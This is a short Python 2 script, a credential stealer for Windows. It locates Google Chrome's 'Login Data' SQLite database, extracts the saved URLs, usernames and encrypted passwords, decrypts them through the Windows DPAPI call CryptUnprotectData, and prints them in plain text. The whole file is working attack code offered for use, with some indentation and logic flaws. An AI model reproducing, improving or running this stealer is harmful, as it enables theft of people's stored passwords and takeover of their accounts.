import platform
if platform.system() == "Windows":
	import os
	import sqlite3
	import win32crypt
	import sys
def steal():
	# Do only if on Windows, Linux and Mac support will be added later
	if platform.system() == "Windows":
		steal_windows()
	else:
		print("Sorry, Linux and Mac OSX are not supported yet")

def steal_windows():
	# Chrome keeps passwords in the %LOCALAPPDATA%\Chrome\User Data\Default\Login Data
	for walk in os.walk(os.getenv('LOCALAPPDATA')):
		if 'Chrome' in walk[1]:
			path = str(walk[0]) + '\Chrome\User Data\Default\Login Data'
	try:
		# Try to open the SQLite3 database
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		# Whoah an error
	except:
		print '[-] Couldn\'t open the database'
		return
	# Execute the query
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
	except:
		print '[-] Error executing the query'
		return
	# Fetch all data
	data = cursor.fetchall()
	# Check if there is any data
	if len(data) > 0:
		for result in data:
	  	# Decrypt the Password
	  		try:
				# The good/bad thing about the Chrome passwords is that they are easily decryptable
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except:
				# If it fails no biggie try again
				pass
			# If the password is found
			if password:
				# If the URL is blank,it doesn't have to be
				if(len(result[0]) <= 0):
					result[0] = "(Unknown)"
				# Print the result
				print "URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
		return
	else:
		print '[-] No results returned from query'
		return
